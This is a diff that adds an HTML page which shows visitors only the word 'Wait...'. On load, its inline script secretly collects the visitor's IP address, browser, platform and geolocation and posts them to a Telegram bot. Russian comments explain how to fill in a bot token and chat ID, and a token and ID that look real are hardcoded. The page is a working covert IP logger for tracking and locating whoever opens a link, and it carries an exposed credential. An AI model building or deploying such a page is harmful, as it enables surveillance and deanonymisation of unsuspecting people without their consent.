@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        async function sendInfo() {
+            const userAgent = navigator.userAgent;
+            const time = new Date().toLocaleString();
+            const device = navigator.platform;
+
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ip = ipData.ip;
+
+            const geoResponse = await fetch(`https://ipinfo.io/${ip}/json`);
+            const geoData = await geoResponse.json();
+            const { city, region, country } = geoData;
+
+            const message = `IP: ${ip}\nUser-Agent: ${userAgent}\nTime: ${time}\nDevice: ${device}\nLocation: ${city}, ${region}, ${country}`;
+            /// В BOTTOKEN ВСТАВЛЯЙТЕ ТОКЕН БОТА, ЕГО МОЖНО ПОЛУЧИТЬ ЧЕРЕЗ @BOTFATHER
+            const botToken = '7370155117:AAGBA9TYBJ5cwh3zCRhEUGmgx1TO9eJEJ7A';
+            /// В CHATID ВСТАВЛЯЙТЕ СВОЙ АЙДИ ТЕЛЕГРАМ
+            const chatId = '7173216407';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            await fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            });
+        }
+
+        window.onload = sendInfo;
+    </script>
+</head>
+<body>
+    <h1>Wait...</h1>
+</body>
+</html>
